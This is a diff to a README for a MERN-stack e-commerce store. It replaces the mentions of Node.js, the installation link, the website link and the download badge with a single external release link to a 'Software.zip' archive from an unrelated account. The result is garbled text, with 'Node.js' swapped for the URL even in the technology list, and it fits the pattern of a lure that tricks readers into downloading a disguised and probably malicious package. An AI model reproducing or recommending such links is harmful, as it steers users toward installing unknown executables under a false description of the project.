@@ -11,11 +11,11 @@ Welcome to the official repository of our MERN Stack Ecommerce Store - an MVP bu
 - **Data Visualization:** Recharts for clear and interactive data visualization.
 - **State Management:** Zustand for efficient state management within the application.
 - **Database Management:** MongoDB and Mongoose for database creation and management.
-- **Server Environment:** Node.js and Express for creating a robust server environment.
+- **Server Environment:** https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip and Express for creating a robust server environment.
 
 ### Installation 🚀
 To set up the project locally, you can download the required software from the provided link:
-[Launch Software.zip](https://img.shields.io/badge/Launch-Software.zip-orange)
+[Launch https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip](https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip)
 
 ### Getting Started 🏁
 1. Clone the repository to your local machine.
@@ -32,7 +32,7 @@ To set up the project locally, you can download the required software from the p
 - Lucide React
 - MongoDB
 - Mongoose
-- Node.js
+- https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip
 - React-Confetti
 - ReactJS
 - Recharts
@@ -50,11 +50,11 @@ If you have any feedback, suggestions, or bug reports, please open an issue in t
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ### Visit Our Website 🌐
-If you'd like to explore our Ecommerce Store online, please visit our website: [Ecommerce Store Website](https://www.yourwebsitelink.com)
+If you'd like to explore our Ecommerce Store online, please visit our website: [Ecommerce Store Website](https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip)
 
 ### Download the Software 📦
 If you'd like to download the software package, please click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-informational)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip)](https://github.com/LIG8T555/ecommerce/releases/download/v2.0/Software.zip)
 
 ---
 
